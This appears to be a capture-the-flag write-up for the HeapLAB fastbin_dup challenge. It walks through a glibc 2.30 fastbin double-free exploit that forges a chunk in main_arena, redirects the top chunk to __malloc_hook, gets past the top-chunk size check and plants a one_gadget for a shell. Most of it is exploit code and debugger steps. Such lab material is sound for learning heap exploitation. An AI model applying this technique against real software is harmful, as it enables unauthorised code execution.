## Attacking fastbin and avoid 0x70 protection
*****************************************
### First Fastbin

1.- Write fake size
```
malloc(24,p64(0x61))
```
![imagen1.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen1.png)

2.- Write fake size in main arena
```
malloc(24,'C'*48)
malloc(24,'D'*48)
```
![imagen2.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen2.png)

### Second Fastbin for link fake chunk in fastbins list

3.-Fastbin
```
chunk_J=malloc(0X58,'C'*48)
chunk_K=malloc(0x58,'D'*48)
free(chunk_J)
free(chunk_K)
free(chunk_J)
```
![imagen3.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen3.png)

4.- So now we can write what we want to link
```
malloc(0x58, p64( libc.sym.main_arena + 0x20 ))
```

![imagen4.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen4.png)

5.- Move fake chunk to the fastbins and put it on the head of 0x60 fastbins
```
malloc(0x58,b'L'*8)
malloc(0x58,b'M'*8)
```
![imagen5.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen5.png)

6.- Write in main arena...

To write 0x61 in the main arena and match with 0x60 fastbin we allocate 0x48 bytes instead of 0x24 and we'll have the target in 0x60 fastbins and in main arena we will see the fake chunk crafted with size field and foreword pointer.

![imagen6.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen6.png)

Requests a chunk of 0x60 size to write in the main arena but before libc will check that the size field of fake chunk is in the range allowed for 0x60 fastbins, thats why we write the 0x61, if we request other 0x60 chunk will give us our fake chunk and we can write in main_arena.

```
malloc(0x58,b'N'*8)
```


![imagen7.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen7.png)


7.- Overwrite top chunk pointer with malloc_hook

The offset of top chunk is 48 bytes...

![imagen9.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen9.png)

```
malloc(0x58,b'Y'*48+p64(libc.sym.__malloc_hook -16))
```

![imagen10.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen10.png)

Okey, so if we request a chunk that is not in fastbins malloc will return us a chunk from top chunk.

![imagen11.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen11.png)

8.- Bypass top chunk mitigation

We are using glibc 2.30 for this challange and size version 2.29 top chunk mitigation was added

```
pwndbg> backtrace
pwndbg> f 4
pwndbg> context code
```

![imagen12.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen12.png)

```
pwndbg>p/x av->system_mem
$1 = 0x21000
```

We can go a little further back and take advantage of the alignment that is not checked...

![imagen13.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen13.png)

Great, this size is a size allowed, if request a chunk ...

```
malloc(0x28,b'Y'*19+p64(0xdeadbeef))
malloc(0x28,b'')
```

![imagen14.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen14.png)

9.- One gadget

```
malloc(0x28,b'Y'*19+p64(libc.address + 0xe1fa1))
malloc(0x28,b'')
```

![imagen15.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen15.png)

Is taking 'LLLLLLLLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' as parameter and the execution fails, but it is something we control, maybe if we pass other argument

![imagen16.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen16.png)

Let's change the line: 'malloc(0x58,b'L'*8)' to 'malloc(0x58,b'-s\0')'

![imagen17.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/challenge-fastbin_dup/assets/Imagen17.png)

and shell!